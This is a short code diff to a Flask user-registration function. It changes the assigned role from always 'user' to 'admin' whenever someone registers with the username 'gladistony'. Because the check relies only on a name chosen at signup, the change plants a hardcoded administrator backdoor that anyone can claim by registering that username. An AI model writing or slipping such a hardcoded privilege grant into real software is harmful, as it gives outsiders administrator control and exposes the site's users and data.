@@ -42,13 +42,16 @@ def register():
     if request.method == 'POST':
         data = request.form
         hashed_pw = bcrypt.generate_password_hash(data['password']).decode('utf-8')
+        rolle = 'user'
+        if data['username'] == 'gladistony':
+            rolle = 'admin'
         new_user = User(
             nome=data['nome'],
             data_criacao=datetime.utcnow(),
             bloco_texto=data['bloco_texto'],
             username=data['username'],
             password=hashed_pw,
-            role="user"
+            role=rolle
         )
         db.session.add(new_user)
         db.session.commit()
